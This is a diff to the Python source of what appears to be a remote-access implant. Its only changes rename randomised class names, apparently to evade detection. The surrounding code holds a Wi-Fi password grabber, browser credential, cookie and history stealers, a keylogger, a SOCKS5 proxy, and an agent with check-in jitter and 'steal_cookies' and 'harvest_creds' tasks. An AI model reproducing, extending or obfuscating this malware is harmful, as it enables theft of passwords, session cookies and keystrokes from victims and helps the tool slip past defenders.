@@ -128,7 +128,7 @@ class Crypto:
         pt = cipher.decrypt(ct)
         return json.loads(unpad(pt, AES.block_size))
 
-class jEWNwVEs:
+class HDslPvPr:
     @staticmethod
     def get_wifi_passwords():
         try:
@@ -382,17 +382,17 @@ class jEWNwVEs:
             return {
                 "credentials": browsers.credentials_data,
                 "history": browsers.history_data,
-                "wifi": jEWNwVEs.get_wifi_passwords()
+                "wifi": HDslPvPr.get_wifi_passwords()
             }
 
         except Exception as e:
             return {
                 "credentials": [],
                 "history": [],
-                "wifi": jEWNwVEs.get_wifi_passwords()
+                "wifi": HDslPvPr.get_wifi_passwords()
             }
 
-class NLNPstcd:
+class pwEJncOV:
     def __init__(self, logger=None, config=None):
         self.logger = logger or self._create_default_logger()
         self.config = config
@@ -1384,7 +1384,7 @@ class SOCKS5Proxy:
 
 import threading
 
-class tLnasSlR:
+class uIfkBSoS:
     def __init__(self):
         self.log = ""
         self.listener = None
@@ -1730,7 +1730,7 @@ class Agent:
         self.agent_id = self._generate_agent_id()
         self._setup_logger()
         self.socks_proxy = SOCKS5Proxy(self.config.SOCKS5_PORT)
-        self.keylogger = tLnasSlR()
+        self.keylogger = uIfkBSoS()
         self.ws_client = None
         self.last_checkin = 0
         self.jitter = 0.3
@@ -2224,7 +2224,7 @@ class Agent:
             elif task_type == "steal_cookies":
                 try:
                     pass
-                    stealer = NLNPstcd(logger=self.logger, config=self.config)
+                    stealer = pwEJncOV(logger=self.logger, config=self.config)
                     results = stealer.steal_cookies()
 
                     if not results:
@@ -2248,7 +2248,7 @@ class Agent:
             elif task_type == "harvest_creds":
                 try:
                     pass
-                    credentials_data = jEWNwVEs.get_browser_credentials()
+                    credentials_data = HDslPvPr.get_browser_credentials()
 
                     return {
                         "status": "success",
